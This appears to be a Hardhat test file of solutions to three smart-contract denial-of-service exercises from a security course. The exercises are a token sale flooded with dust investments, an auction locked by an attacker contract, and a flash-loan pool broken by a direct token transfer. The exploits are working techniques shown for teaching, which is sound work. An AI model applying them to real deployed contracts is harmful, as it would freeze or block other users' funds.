import { parse } from "path";

import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";

import { FlashLoanUser, TokenSale, Auction, ShibaPool, ShibaToken } from '../../typechain-types';
import { token } from "../../typechain-types/@openzeppelin/contracts";

const { deployContract, getSigners, parseEther } = ethers;

describe("DOS Attacks", () => {
  describe("DOS Exercise 1", () => {
    let deployer: SignerWithAddress;
    let user1: SignerWithAddress;
    let user2: SignerWithAddress;
    let user3: SignerWithAddress;
    let attacker: SignerWithAddress;

    const USER1_INVESTMENT = parseEther('5');
    const USER2_INVESTMENT = parseEther('15');
    const USER3_INVESTMENT = parseEther('10');

    let tokenSale: TokenSale;

    before(async () => {
      [deployer, user1, user2, user3, attacker] = await getSigners();
      tokenSale = await deployContract('TokenSale');

      // Invest
      await tokenSale.connect(user1).invest({ value: USER1_INVESTMENT });
      await tokenSale.connect(user2).invest({ value: USER2_INVESTMENT });
      await tokenSale.connect(user3).invest({ value: USER3_INVESTMENT });

      expect(await tokenSale.claimable(user1.address, 0)).equals(USER1_INVESTMENT * 5n);
      expect(await tokenSale.claimable(user2.address, 0)).equals(USER2_INVESTMENT * 5n);
      expect(await tokenSale.claimable(user3.address, 0)).equals(USER3_INVESTMENT * 5n);

    });

    it('Exploit', async () => {
      const ATTACKER_INVESTMENT = parseEther('0.000000000001');
      for (let i = 0; i < 10000; i++) {
        await tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENT });
      }
    }).timeout(100000000);

    after(async () => {
      await expect(tokenSale.distributeTokens()).to.be.reverted;
    });
  });

  describe("DOS Exercise 2", () => {
    let deployer: SignerWithAddress;
    let user1: SignerWithAddress;
    let user2: SignerWithAddress;
    let attacker: SignerWithAddress;

    const USER1_FIRST_BID = parseEther('5');
    const USER2_FIRST_BID = parseEther('6.5');

    let auction: Auction;

    before(async () => {
      [deployer, user1, user2, attacker] = await getSigners();
      auction = await deployContract('Auction');

      // Invest
      await auction.connect(user1).bid({ value: USER1_FIRST_BID });
      await auction.connect(user2).bid({ value: USER2_FIRST_BID });

      expect(await auction.highestBid()).equals(USER2_FIRST_BID);
      expect(await auction.currentLeader()).equals(user2.address);
    });

    it('Exploit', async () => {
      let currentHighestBid: bigint = await auction.highestBid();
      const attackAuction = await deployContract('AttackAuction', [auction.target], {
        value: currentHighestBid + parseEther('0.00000001')
      });
    });

    after(async () => {
      let highestBid = await auction.highestBid();

      // Even though User1 bids highestBid * 3, transaction is reverted
      await expect(auction.connect(user1).bid({ value: highestBid * 3n })).to.be.reverted;

      // User1 and User2 are not currentLeader
      expect(await auction.currentLeader()).to.not.equal(user1.address);
      expect(await auction.currentLeader()).to.not.equal(user2.address);
    });
  });

  describe("DOS Exercise 3", () => {
    let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;

    const INITIAL_SUPPLY = parseEther('1000000'); // 1 Million
    const TOKENS_IN_POOL = parseEther('100000'); // 100K
    const ATTACKER_TOKENS = parseEther('10'); // 10

    let token: ShibaToken;
    let pool: ShibaPool;

    let userContract: FlashLoanUser;

    before(async () => {
      [deployer, user, attacker] = await getSigners();

      // Deploy contracts
      token = await deployContract('ShibaToken', [INITIAL_SUPPLY]);
      pool = await deployContract('ShibaPool', [token.target]);

      // Send tokens
      await token.transfer(attacker.address, ATTACKER_TOKENS);
      await token.approve(pool.target, TOKENS_IN_POOL);
      await pool.depositTokens(TOKENS_IN_POOL);

      // Balances Check
      expect(await token.balanceOf(pool.target)).equals(TOKENS_IN_POOL);

      expect(await token.balanceOf(attacker.address)).equals(ATTACKER_TOKENS);

      // FlashLoan Check
      userContract = await deployContract('FlashLoanUser', [pool.target], user);
      await userContract.requestFlashLoan(10);
    });

    it('Exploit', async () => {
      await token.connect(attacker).transfer(pool.target, parseEther('1'));
    });

    after(async () => {
      await expect(userContract.requestFlashLoan(10)).to.be.reverted;
    });
  });
})